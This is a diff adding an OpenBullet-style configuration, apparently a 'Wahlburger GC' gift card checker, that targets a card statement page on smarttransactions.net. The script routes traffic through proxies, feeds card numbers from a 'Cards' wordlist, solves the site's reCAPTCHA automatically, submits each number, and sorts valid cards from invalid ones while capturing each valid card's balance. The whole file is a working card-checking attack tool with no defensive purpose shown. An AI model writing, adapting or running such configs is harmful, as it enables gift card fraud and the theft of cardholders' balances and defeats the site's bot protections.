@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "Wahlburger GC",
+  "SuggestedBots": 1,
+  "LastModified": "2018-06-28T20:22:09.4520992+00:00",
+  "AdditionalInfo": "",
+  "Author": "Tunacan",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#GET_REQUEST REQUEST GET "https://smarttransactions.net/GetUMDCardStatement.php" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE ": " 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+RECAPTCHA "https://smarttransactions.net/GetUMDCardStatement.php" "6LcWqwUTAAAAAHT7MNqdvShLH6Z6PkAERhdnDURU" -> VAR "RECAP" 
+#POST_REQUEST REQUEST POST "https://smarttransactions.net/GetUMDCardStatement.php" AutoRedirect=TRUE 
+  CONTENT "query=card&cmdSubmit=Submit&txtName=<USER>&g-recaptcha-response=<RECAP>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Orgin: https://smarttransactions.net" 
+  HEADER "Referer: https://smarttransactions.net/GetUMDCardStatement.php" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Invalid Card#" 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" EqualTo "$" 
+    KEY "<SOURCE>" DoesNotContain "Invalid Card#" 
+PARSE "<SOURCE>" LR "<div class='o--card-balance'>" "</div>" Recursive=FALSE -> CAP "Balance" "" "" 
+PARSE "<SOURCE>" LR "<td class='type'>" "</td>" Recursive=FALSE -> CAP "Invalid" "" "" 
